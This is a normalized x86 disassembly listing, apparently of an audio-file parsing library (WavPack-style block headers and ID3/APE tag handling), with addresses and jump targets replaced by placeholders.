cmp [ eax ] 0x77
je r-xdata
cmp [ esp + 0xd ] 0x76
jne r-xdata
mov edx eax
lea ecx [ esp + 0xc ]
sub edx ecx
add ebp edx
cmp ebp 0x100000
jbe r-xdata
add eax 0x1
lea ecx [ esp + 0x2c ]
cmp eax ecx
jb r-xdata
cmp [ esp + 0xe ] 0x70
lea eax [ esp + 0xe ]
jne r-xdata
lea ecx [ esp + 0x2c ]
cmp eax ecx
jae r-xdata
cmp [ esp + 0xf ] 0x6b
lea eax [ esp + 0xf ]
jne r-xdata
test [ esp + 0x10 ] 0x1
lea eax [ esp + 0x10 ]
jne r-xdata
cmp [ esp + 0x12 ] 0x10
jge r-xdata
cmp [ esp + 0x13 ] 0x0
jne r-xdata
cmp [ esp + 0x15 ] 0x4
jne r-xdata
mov cl [ esp + 0x14 ]
cmp cl 0x2
jl r-xdata
cmp cl 0x10
jle r-xdata
mov eax [ esp + 0x34 ]
mov edi eax
push r--data
mov ecx 0x8
lea esi [ esp + 0x10 ]
push eax
[ edi ] [ esi ]
call sub_4093e0
add esp 0x8
pop edi
pop esi
mov eax ebp
pop ebp
add esp 0x20
retn
sub_403ab0
sub esp 0x24
push ebx
push ebp
mov ebp [ esp + 0x34 ]
push esi
mov esi [ esp + 0x34 ]
mov eax [ esi + 0x14 ]
push edi
push ebp
mov [ esp + 0x14 ] 0xffffffff
call eax
add esp 0x4
cmp eax 0x124f80
jbe r-xdata
mov edx [ esi + 0x8 ]
push 0x0
push ebp
call edx
add esp 0x8
mov ecx [ esi + 0xc ]
push 0x2
push 0xfff00000
push ebp
call ecx
add esp 0xc
jmp r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
lea ecx [ ecx ]
lea eax [ esp + 0x14 ]
push eax
push esi
mov ebx ebp
call sub_4039b0
add esp 0x8
cmp eax 0xffffffff
je r-xdata
call sub_40fdab
add esp 0x4
call sub_40fdab
mov eax [ esp + 0x2c ]
add esp 0x4
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
push edx
push esi
mov ebx ebp
call sub_4039b0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
test [ esp + 0x2c ] 0x1000
je r-xdata
mov ecx [ esp + 0x18 ]
add ecx 0x8
push ecx
call sub_40fe88
mov ebx eax
mov ecx 0x8
lea esi [ esp + 0x18 ]
mov edi ebx
[ edi ] [ esi ]
mov edx [ esp + 0x1c ]
mov esi [ esp + 0x3c ]
mov ecx [ esi ]
add edx 0xffffffe8
push edx
lea eax [ ebx + 0x20 ]
push eax
push ebp
call ecx
mov edx [ esp + 0x28 ]
add esp 0x10
add edx 0xffffffe8
cmp eax edx
push ebx
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
mov ecx [ esp + 0x24 ]
add ecx eax
mov [ esp + 0x10 ] ecx
sub_403bb0
sub esp 0x24
push ebx
push ebp
mov ebp [ esp + 0x30 ]
mov eax [ ebp + 0x170 ]
mov ecx [ ebp + 0x70 ]
mov edx [ ebp + 0x78 ]
push esi
push edi
mov edi [ ebp + eax * 4 + 0x17c ]
mov eax [ ecx + 0x4 ]
push edx
mov [ esp + 0x14 ] edi
call eax
mov edx [ ebp + 0x70 ]
mov ebx [ ebp + 0x78 ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
mov esi eax
call sub_4039b0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax 0x1
mov [ edi + 0x110 ] eax
add [ ebp + 0x90 ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24
retn
test [ ebp + 0x9c ] 0x20
je r-xdata
mov ecx [ esp + 0x24 ]
sub ecx [ ebp + 0xbc ]
xor ecx ecx
mov [ edi + 0xa8 ] ecx
jmp r-xdata
mov eax [ edi + 0x10 ]
cmp eax ecx
jne r-xdata
add eax esi
mov [ ebp + 0x88 ] eax
mov ebx [ esp + 0x2c ]
mov edx ebx
and edx 0x800
mov [ esp + 0x24 ] ecx
mov [ esp + 0x38 ] edx
je r-xdata
sub ecx eax
js r-xdata
mov edx [ edi + 0x14 ]
cmp edx [ esp + 0x28 ]
jne r-xdata
mov eax [ ebp + 0x70 ]
mov ecx [ ebp + 0x78 ]
mov edx [ eax + 0x4 ]
push ecx
call edx
mov ecx [ ebp + 0x70 ]
mov ebx [ ebp + 0x78 ]
mov esi eax
lea eax [ esp + 0x18 ]
push eax
push ecx
call sub_4039b0
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
mov esi 0x1
mov [ edi + 0x110 ] esi
mov eax [ ebp + 0x70 ]
mov ecx [ ebp + 0x78 ]
mov edx [ eax + 0xc ]
push esi
push 0xffffffe0
push ecx
call edx
add esp 0xc
add [ ebp + 0x90 ] esi
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
mov eax [ edi + 0x18 ]
xor edx edx
xor ecx ecx
cmp eax ebx
je r-xdata
mov edx [ esp + 0x18 ]
add edx 0x8
push edx
call sub_40fe88
mov [ edi + 0x74 ] eax
mov edi eax
mov ecx 0x8
lea esi [ esp + 0x18 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x14 ]
mov edx [ edi + 0x74 ]
mov eax [ ebp + 0x70 ]
add ecx 0xffffffe8
push ecx
mov ecx [ ebp + 0x78 ]
add edx 0x20
push edx
mov edx [ eax ]
push ecx
call edx
mov ecx [ esp + 0x28 ]
add ecx 0xffffffe8
add esp 0x10
cmp eax ecx
jne r-xdata
test eax 0x800
je r-xdata
mov edx [ edi + 0x74 ]
push edx
call sub_40fdab
add esp 0x4
mov [ edi + 0x74 ] 0x0
jmp r-xdata
test [ esp + 0x2c ] 0x80000000
jne r-xdata
test eax 0x1000
je r-xdata
or edx 0xffffffff
mov [ edi + 0x110 ] 0x0
mov ecx 0x8
lea esi [ esp + 0x14 ]
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x24
retn
cmp [ esp + 0x38 ] 0x0
je r-xdata
add edx 0x1
test ebx 0x1000
je r-xdata
or ecx 0xffffffff
sub ecx edx
mov eax 0x0
sets al
lea eax [ eax + eax - 0x1 ]
test eax eax
je r-xdata
add ecx 0x1
cmp eax 0xffffffff
je r-xdata
sub_403da0
push ebx
push ebp
push esi
push 0xa8
lea esi [ edi + 0xc8 ]
push 0x0
push esi
call sub_40fb30
add esp 0xc
lea ebx [ esi + 0x84 ]
lea ebp [ esi + 0x4 ]
push 0xffffffe0
push 0xffffff60
jmp r-xdata
cmp [ ebp ] 0x54
je r-xdata
push 0x8
push r--data
push ebx
call sub_411354
add esp 0xc
test eax eax
jne r-xdata
push ecx
call edx
mov eax [ edi + 0x70 ]
mov ecx [ edi + 0x74 ]
mov edx [ eax ]
add esp 0xc
push 0x20
push ebx
push ecx
call edx
add esp 0xc
cmp eax 0x20
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x14 ] eax
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] eax
pop ebp
mov eax 0x1
pop ebx
retn
mov [ esi ] 0xffffff80
mov eax [ edi + 0x70 ]
mov ecx [ edi + 0x74 ]
mov edx [ eax + 0xc ]
push 0x2
push 0xffffff80
push ecx
call edx
mov eax [ edi + 0x70 ]
mov ecx [ edi + 0x74 ]
mov edx [ eax ]
push 0x80
push ebp
push ecx
call edx
add esp 0x18
cmp eax 0x80
jne r-xdata
push r--data
push ebx
call sub_4093e0
add esp 0x8
cmp [ esi + 0x8c ] 0x7d0
jne r-xdata
push 0xa8
push 0x0
push esi
call sub_40fb30
add esp 0xc
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x3
push r--data
push ebp
call sub_411354
add esp 0xc
test eax eax
je r-xdata
cmp [ esi + 0x94 ] 0x0
je r-xdata
cmp [ ebp ] 0x54
mov eax [ edi + 0x70 ]
mov ecx [ edi + 0x74 ]
mov edx [ eax + 0xc ]
push 0x2
jne r-xdata
mov eax [ esi + 0x90 ]
cmp eax 0x20
jbe r-xdata
cmp eax 0x100000
jge r-xdata
push eax
call sub_40fe88
add esp 0x4
test eax eax
mov [ esi + 0xa4 ] eax
jne r-xdata
xor eax eax
cmp [ ebp ] 0x54
mov ecx 0xffffffe0
setne al
sub ecx [ esi + 0x90 ]
push 0x2
sub eax 0x1
and eax 0xffffff80
mov [ esi ] eax
add [ esi ] ecx
mov eax [ esi ]
mov edx [ edi + 0x70 ]
mov ecx [ edx + 0xc ]
push eax
mov eax [ edi + 0x74 ]
push eax
call ecx
mov edx [ esi + 0x90 ]
mov eax [ esi + 0xa4 ]
push edx
push 0x0
push eax
call sub_40fb30
mov ecx [ edi + 0x70 ]
mov edx [ edi + 0x74 ]
mov eax [ ecx ]
push 0x20
push ebx
push edx
call eax
add esp 0x24
cmp eax 0x20
jne r-xdata
mov edx [ esi + 0xa4 ]
push edx
jmp r-xdata
push 0x8
push r--data
push ebx
call sub_411354
add esp 0xc
test eax eax
jne r-xdata
call sub_40fdab
push 0xa8
push 0x0
push esi
call sub_40fb30
add esp 0x10
pop esi
pop ebp
xor eax eax
pop ebx
retn
push r--data
push ebx
call sub_4093e0
add esp 0x8
cmp [ esi + 0x8c ] 0x7d0
jne r-xdata
mov ecx [ esi + 0xa4 ]
push ecx
jmp r-xdata
cmp [ esi + 0x94 ] 0x0
je r-xdata
mov eax [ esi + 0x90 ]
cmp eax 0x20
jb r-xdata
cmp eax 0x100000
jg r-xdata
mov edx [ esi + 0xa4 ]
mov ecx [ edi + 0x70 ]
mov ecx [ ecx ]
add eax 0xffffffe0
push eax
mov eax [ edi + 0x74 ]
push edx
push eax
call ecx
mov edx [ esi + 0x90 ]
sub edx 0x20
add esp 0xc
cmp eax edx
je r-xdata
push 0x80
push 0x0
push ebp
call sub_40fb30
add esp 0xc
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ esi + 0xa4 ]
push eax
sub_404000
cmp [ eax + ecx - 0x1 ] 0x0
push esi
mov esi edx
lea edx [ eax + ecx - 0x1 ]
je r-xdata
cmp eax edx
ja r-xdata
cmp [ edx - 0x1 ] 0x0
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
jmp r-xdata
add edx 0xffffffff
mov [ esi ] 0x0
pop esi
retn
cmp eax edx
ja r-xdata
cmp [ eax ] 0x20
jne r-xdata
add eax 0x1
mov [ esi ] cl
mov cl [ eax ]
add esi 0x1
test cl cl
jne r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
add eax 0x1
jmp r-xdata
sub edx 0x1
cmp cl 0x20
jne r-xdata
cmp eax edx
jbe r-xdata
sub_404070
push esi
mov esi [ esp + 0x8 ]
xor eax eax
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi + 0x14 ]
test cl 0x8
je r-xdata
test ecx 0x1000000
jne r-xdata
mov eax 0x4
jmp r-xdata
cmp [ esi + 0x98 ] 0x0
je r-xdata
mov eax 0x2
cmp [ esi + 0xa8 ] 0x0
je r-xdata
or eax 0x3
test cl cl
jns r-xdata
and eax 0xfffffffd
test ecx 0x800
je r-xdata
or eax 0x8
test ecx 0x200
je r-xdata
or eax 0x20
test ecx 0x1000
jne r-xdata
test ecx 0x2000000
je r-xdata
or eax 0x40
or eax 0x400
mov edx [ esi + 0x17c ]
test edx edx
je r-xdata
test ecx 0x40000
je r-xdata
or eax 0x80
cmp [ edx + 0x8 ] 0x405
jge r-xdata
test ecx 0x8000000
je r-xdata
or eax 0x200
mov cl 0x41
cmp [ esi + 0x14c ] cl
je r-xdata
or eax 0x800
or eax 0x10
cmp [ esi + 0x14c ] cl
jne r-xdata
cmp [ esi + 0xcc ] 0x54
jne r-xdata
or eax 0x100
sub_404140
sub esp 0x18
xor eax eax
push ebp
mov ebp [ esp + 0x20 ]
cmp [ ebp + 0x19c ] eax
mov edx [ ebp + 0x1c ]
mov [ ebp + 0x170 ] eax
mov ecx [ ebp + 0x17c ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
je r-xdata
cmp [ esp + 0x28 ] eax
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push eax
push ecx
push ebp
call sub_406ff0
add esp 0xc
pop ebp
add esp 0x18
retn
mov eax [ esp + 0xc ]
pop ebp
add esp 0x18
retn
push ebx
push esi
push edi
cmp [ ebp + 0x60 ] 0x1000000
jae r-xdata
test [ eax + 0x18 ] 0x800
je r-xdata
pop edi
pop esi
pop ebx
push ebp
call sub_403910
mov eax [ ebp + 0x70 ]
mov ecx [ ebp + 0x74 ]
mov edx [ eax + 0x4 ]
push ecx
call edx
mov ecx [ ebp + 0x70 ]
mov ebx [ ebp + 0x74 ]
mov [ ebp + 0x84 ] eax
mov eax [ esp + 0x34 ]
push eax
push ecx
call sub_4039b0
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov edx [ eax + 0x10 ]
add edx ecx
cmp [ eax + 0xa8 ] edx
jb r-xdata
test [ ebp + 0x9c ] 0x20
mov ecx [ esp + 0x2c ]
je r-xdata
mov eax [ esp + 0x2c ]
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ ebp + 0xbc ]
sub [ ecx + 0x10 ] edx
xor edx edx
mov [ ecx + 0xa8 ] edx
mov [ ecx + 0x10 ] edx
jmp r-xdata
cmp [ esp + 0x34 ] 0x0
jne r-xdata
mov ecx eax
test [ ecx + 0x18 ] 0x800
je r-xdata
mov eax [ esp + 0x18 ]
lea edi [ ebp + 0x1a0 ]
mov ecx 0x7
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
mov [ ebx + 0x14 ] 0x0
mov [ ebx + 0x4 ] 0x18
pop ebx
pop ebp
add esp 0x18
retn
cmp [ ebx + 0x14 ] 0x0
mov [ ebx + 0x10c ] 0x0
je r-xdata
add [ ebp + 0x84 ] eax
mov ebx [ esp + 0x2c ]
mov eax [ ebx + 0x4 ]
add eax 0x8
push eax
call sub_40fe88
mov [ ebx + 0x6c ] eax
mov edi eax
mov ecx 0x8
mov esi ebx
[ edi ] [ esi ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x6c ]
mov ecx [ ebp + 0x70 ]
sub edx 0x18
push edx
mov edx [ ebp + 0x74 ]
add eax 0x20
push eax
mov eax [ ecx ]
push edx
call eax
mov ecx [ ebx + 0x4 ]
sub ecx 0x18
add esp 0x10
cmp eax ecx
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
pop ebp
add esp 0x18
retn
mov eax [ ecx + 0x10 ]
mov ecx [ ecx + 0xa8 ]
lea esi [ eax + edx ]
cmp ecx esi
jae r-xdata
mov esi 0x1
mov edx [ ebx + 0xa8 ]
cmp edx [ ebx + 0x10 ]
je r-xdata
cmp ecx eax
jae r-xdata
cmp [ ebx + 0x10c ] 0x0
jne r-xdata
cmp [ ebp + 0x98 ] 0x0
je r-xdata
mov esi 0x1
add [ ebp + 0x90 ] esi
jmp r-xdata
sub eax ecx
add eax edx
mov esi eax
mov eax [ esp + 0x34 ]
cmp esi eax
mov [ esp + 0x10 ] esi
jbe r-xdata
sub eax ecx
cmp eax 0x40000
ja r-xdata
mov [ ebx + 0x10c ] esi
push ebp
call sub_409770
add esp 0x4
test eax eax
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
push ebp
call sub_403bb0
add esp 0x4
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov edi [ esp + 0x2c ]
cmp [ edi + 0x10c ] 0x0
jne r-xdata
mov esi eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x2c ]
lea edi [ ebp + 0x1a0 ]
mov ecx 0x9
mov esi r--data
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov [ eax + 0x14 ] 0x0
mov [ eax + 0x4 ] 0x18
mov eax [ esp + 0xc ]
pop ebp
add esp 0x18
retn
mov edx [ esp + 0x34 ]
cmp eax edx
jbe r-xdata
add [ ebp + 0x90 ] esi
mov [ edi + 0x10c ] 0x1
cmp [ ebp + 0xa4 ] 0x0
jne r-xdata
push ebp
call sub_409770
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x2c ]
add [ esp + 0x18 ] eax
add ecx eax
mov [ esi + 0xa8 ] ecx
mov ecx [ ebp + 0xa4 ]
sub edx eax
test ecx ecx
mov [ esp + 0x34 ] edx
je r-xdata
mov eax edx
mov edx [ esp + 0x30 ]
push esi
push edx
push ebp
call sub_40b480
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x38 ]
add esp 0xc
test [ edi + 0x18 ] 0x1000
jne r-xdata
add [ ebp + 0x90 ] 0x1
imul eax [ esp + 0x1c ]
mov edx eax
imul ecx eax
mov edx ecx
jmp r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
cmp [ ebp + 0x174 ] 0x8
je r-xdata
lea eax [ esi * 8 ]
push eax
call sub_40fe88
mov ecx [ esp + 0x34 ]
add esp 0x4
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] ecx
nop
mov esi [ esp + 0x30 ]
mov ecx edx
xor eax eax
mov edi esi
lea edx [ esi + edx * 4 ]
[ edi ]
mov [ esp + 0x30 ] edx
jmp r-xdata
test edx edx
je r-xdata
lea edi [ ebp + 0x1a0 ]
mov ecx 0x7
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebp + 0xa4 ]
test eax eax
mov ecx [ esp + 0x30 ]
je r-xdata
mov eax [ r--data ]
mov [ ebp + 0x1a0 ] eax
mov ecx [ r--data ]
mov [ ebp + 0x1a4 ] ecx
mov edx [ r--data ]
mov [ ebp + 0x1a8 ] edx
mov eax [ r--data ]
mov [ ebp + 0x1ac ] eax
mov cx [ r--data ]
mov eax [ esp + 0x18 ]
pop edi
mov [ ebp + 0x1b0 ] cx
mov dl [ r--data ]
pop esi
pop ebx
mov [ ebp + 0x1b2 ] dl
pop ebp
add esp 0x18
retn
mov edx [ ebp + eax * 4 + 0x17c ]
mov ebx edx
push 0x758
call sub_40fe88
mov edx [ ebp + 0x174 ]
mov [ ebp + edx * 4 + 0x17c ] eax
mov eax [ ebp + 0x174 ]
mov esi [ ebp + eax * 4 + 0x17c ]
push 0x758
xor edi edi
add eax 0x1
push edi
push esi
mov [ ebp + 0x174 ] eax
call sub_40fb30
mov eax [ ebp + 0x70 ]
mov ebx [ ebp + 0x74 ]
push esi
push eax
call sub_4039b0
add esp 0x18
cmp eax 0xffffffff
je r-xdata
mov eax edi
imul eax [ esp + 0x1c ]
imul eax edi
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov eax [ ebp + 0x17c ]
mov [ eax + 0x14 ] edi
mov ecx [ ebp + 0x17c ]
mov [ ecx + 0x4 ] 0x18
jmp r-xdata
test [ ebp + 0x9c ] 0x20
je r-xdata
mov eax [ ebp + 0x8c ]
cmp eax 0xffffffff
je r-xdata
push ebp
call sub_40b420
add esp 0x4
test eax eax
je r-xdata
add [ esp + 0x18 ] edi
sub [ esp + 0x34 ] edi
lea edx [ ecx + eax * 4 ]
mov eax [ esi + 0x14 ]
add eax [ esi + 0x10 ]
mov [ esp + 0x30 ] edx
cmp [ esi + 0xa8 ] eax
jne r-xdata
add [ esp + 0x14 ] 0x8
mov edx [ esp + 0x1c ]
add edx edx
add edx edx
add [ esp + 0x14 ] 0x4
jmp r-xdata
mov edx [ esp + 0x1c ]
add edx edx
add edx edx
mov edi [ esp + 0x10 ]
mov [ esp + 0x20 ] 0x1
mov ecx [ ebp + 0xbc ]
sub [ esi + 0x10 ] ecx
mov [ esi + 0xa8 ] edi
mov [ esi + 0x10 ] edi
jmp r-xdata
cmp [ esi + 0xa8 ] eax
je r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
mov ecx [ esp + 0x24 ]
mov [ ebp + 0x170 ] 0x0
mov esi [ ebp + 0x17c ]
push ecx
mov [ esp + 0x30 ] esi
call sub_40fdab
add esp 0x4
jmp r-xdata
cmp [ ebp + 0x174 ] 0x8
je r-xdata
mov edi [ esi ]
add esi 0x4
mov [ eax ] edi
mov edi [ esi ]
sub ecx 0x1
mov [ eax + 0x4 ] edi
add esi 0x4
add eax edx
test ecx ecx
jne r-xdata
mov edi [ esp + 0x10 ]
test [ ebx + 0x18 ] 0x1000
jne r-xdata
mov edi [ esi ]
sub ecx 0x1
mov [ eax ] edi
add esi 0x4
add eax edx
test ecx ecx
jne r-xdata
mov edi [ esp + 0x10 ]
test [ esi + 0x18 ] 0x1000
jne r-xdata
mov edx [ ebp + 0x17c ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x17c ]
mov [ eax + 0x4 ] 0x18
mov [ ebx + 0x10c ] 0x0
cmp [ ebp + 0x98 ] 0x0
je r-xdata
mov ebx esi
mov edx [ ebx + 0x4 ]
add edx 0x8
push edx
call sub_40fe88
mov [ ebx + 0x6c ] eax
mov edi eax
mov ecx 0x8
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x6c ]
mov eax [ ebp + 0x70 ]
sub ecx 0x18
push ecx
mov ecx [ ebp + 0x74 ]
add edx 0x20
push edx
mov edx [ eax ]
push ecx
call edx
mov ecx [ ebx + 0x4 ]
sub ecx 0x18
add esp 0x10
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x70 ]
mov edx [ ebp + 0x74 ]
mov eax [ ecx + 0x18 ]
push edx
call eax
add esp 0x4
test eax eax
je r-xdata
add [ ebp + 0x170 ] 0x1
jmp r-xdata
cmp [ ebx + 0x10c ] 0x0
jne r-xdata
push ebp
call sub_403bb0
add esp 0x4
cmp [ ebp + 0x98 ] 0x0
je r-xdata
mov ecx [ esi + 0x6c ]
mov eax 0xaaaaaaab
mul [ ecx + 0x4 ]
shr edx 0x1
cmp edx 0x4000
jle r-xdata
mov eax [ ebp + 0x170 ]
cmp eax [ ebp + 0x174 ]
jne r-xdata
mov [ ebx + 0x10c ] 0x1
jmp r-xdata
push ebp
call sub_409770
add esp 0x4
test eax eax
jne r-xdata
add [ ebp + 0x90 ] 0x1
cmp [ esi + 0x74 ] 0x0
je r-xdata
neg edx
mov edx 0xffffc000
jmp r-xdata
mov edi [ esp + 0x10 ]
mov esi [ esp + 0x24 ]
push edi
push esi
push ebp
call sub_40b480
mov eax [ esp + 0x20 ]
add esp 0xc
test [ ebx + 0x18 ] 0x4
mov ecx edi
je r-xdata
add [ ebp + 0x90 ] 0x1
mov eax [ ebp + 0x70 ]
mov ecx [ ebp + 0x78 ]
mov edx [ eax + 0x18 ]
push ecx
call edx
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0x70 ]
mov ecx [ ebp + 0x74 ]
push 0x1
push edx
mov edx [ eax + 0xc ]
push ecx
call edx
add esp 0xc
mov ecx [ esi + 0x74 ]
mov eax 0xaaaaaaab
mul [ ecx + 0x4 ]
shr edx 0x1
cmp edx 0x4000
jle r-xdata
neg edx
mov edx 0xffffc000
jmp r-xdata
mov eax [ ebp + 0x70 ]
mov ecx [ ebp + 0x78 ]
push 0x1
push edx
mov edx [ eax + 0xc ]
push ecx
call edx
add esp 0xc
sub_404830
sub esp 0x40
push ebp
mov ebp [ esp + 0x48 ]
push esi
push r--data
push ebp
mov esi eax
mov [ esp + 0x10 ] 0x0
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
push r--data
push ebp
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebx + 0x7 ]
mov ecx 0x1e
lea edx [ esp + 0x8 ]
call sub_404000
jmp r-xdata
push r--data
push ebp
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebx + 0x25 ]
mov ecx 0x1e
lea edx [ esp + 0x8 ]
call sub_404000
jmp r-xdata
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
push r--data
push ebp
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebx + 0x43 ]
mov ecx 0x1e
lea edx [ esp + 0x8 ]
call sub_404000
jmp r-xdata
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
test esi esi
je r-xdata
push r--data
push ebp
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebx + 0x61 ]
mov ecx 0x4
lea edx [ esp + 0x8 ]
call sub_404000
jmp r-xdata
pop esi
pop ebp
add esp 0x40
retn
test edi edi
je r-xdata
push r--data
push ebp
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebx + 0x65 ]
mov ecx 0x1e
lea edx [ esp + 0x8 ]
call sub_404000
jmp r-xdata
cmp eax edi
jge r-xdata
xor eax eax
mov al [ ebx + 0x82 ]
test al al
je r-xdata
cmp edi 0x4
jl r-xdata
lea ecx [ esp + 0x8 ]
mov edx ecx
sub esi edx
nop
cmp [ ebx + 0x81 ] 0x0
jne r-xdata
lea eax [ edi - 0x1 ]
push eax
lea ecx [ esp + 0xc ]
push ecx
push esi
call sub_411230
mov al 0x2e
add esp 0xc
mov [ esi + edi - 0x2 ] al
mov [ esi + edi - 0x3 ] al
mov [ esi + edi - 0x4 ] al
mov [ esi + edi - 0x1 ] 0x0
pop esi
lea eax [ edi - 0x1 ]
pop ebp
add esp 0x40
retn
mov dl [ ecx ]
mov [ esi + ecx ] dl
add ecx 0x1
test dl dl
jne r-xdata
pop esi
pop ebp
add esp 0x40
retn
movsx eax al
push eax
lea ecx [ esp + 0xc ]
push r--data
push ecx
call sub_40fa35
add esp 0xc
sub_4049c0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov edi edi
push ebp
push esi
call sub_403490
add esp 0x8
test eax eax
jne r-xdata
cmp [ esi + 0x14c ] al
lea edi [ esi + 0x14c ]
jne r-xdata
cmp [ edi ] 0x41
jne r-xdata
push 0x8
push r--data
push edi
call sub_411230
add esp 0xc
mov [ esi + 0x154 ] 0x7d0
mov [ esi + 0x158 ] 0x20
mov [ esi + 0x15c ] 0x0
mov [ esi + 0x160 ] 0x80000000
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esp + 0x20 ]
mov ecx [ esi + 0x16c ]
add [ esi + 0x15c ] 0x1
lea edi [ ebx + eax + 0x9 ]
add [ esi + 0x158 ] edi
mov eax [ esi + 0x158 ]
push eax
push ecx
mov [ esp + 0x1c ] 0x0
call sub_41026d
mov edx [ esi + 0x158 ]
mov [ esi + 0x16c ] eax
sub eax edi
lea esi [ eax + edx - 0x20 ]
lea eax [ esp + 0x28 ]
push r--data
push eax
call sub_409460
lea ecx [ esp + 0x24 ]
push r--data
push ecx
call sub_409460
mov edx [ esp + 0x38 ]
mov [ esi ] edx
mov eax [ esp + 0x2c ]
add esi 0x4
lea ecx [ esp + 0x38 ]
push r--data
mov [ esi ] eax
push ecx
add esi 0x4
call sub_4093e0
lea edx [ esp + 0x34 ]
push r--data
push edx
call sub_4093e0
mov ecx esi
add esp 0x28
mov eax ebp
sub ecx ebp
mov dl [ eax ]
mov [ ecx + eax ] dl
add eax 0x1
test dl dl
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push eax
push ecx
lea edx [ esi + ebx + 0x1 ]
push edx
call sub_410ec0
add esp 0xc
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
sub_404b30
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_403910
mov eax [ esi + 0x17c ]
add esp 0x4
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
push eax
call sub_40fdab
add esp 0x4
cmp [ esi + 0xac ] 0x0
je r-xdata
push esi
call sub_406850
add esp 0x4
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
push eax
call sub_40fdab
add esp 0x4
mov [ esi + 0x5c ] 0x0
mov [ esi + 0x60 ] 0x0
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push eax
call sub_40f0ed
add esp 0x4
push esi
call sub_40fdab
add esp 0x4
xor eax eax
pop esi
retn
push eax
call sub_40fdab
add esp 0x4
mov [ esi + 0x16c ] 0x0
push eax
call sub_40f0ed
add esp 0x4
sub_404be0
sub esp 0xc
push ebp
push 0x1f0
call sub_40fe88
mov ebp eax
add esp 0x4
test ebp ebp
mov [ esp + 0xc ] 0x0
jne r-xdata
push ebx
push edi
push 0x1f0
push 0x0
push ebp
call sub_40fb30
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x3c ]
mov ebx [ esp + 0x38 ]
mov [ ebp + 0x78 ] ecx
mov ecx [ esp + 0x28 ]
mov [ ebp + 0x74 ] eax
mov [ ebp + 0x70 ] ecx
mov [ ebp + 0x8c ] 0xffffffff
mov [ ebp + 0xa0 ] edx
mov [ ebp + 0x9c ] ebx
push eax
mov eax [ ecx + 0x14 ]
call eax
add esp 0x10
test bl 0x42
mov [ ebp + 0x7c ] eax
je r-xdata
mov ecx [ r--data ]
mov eax [ esp + 0x20 ]
mov [ eax ] ecx
mov edx [ r--data ]
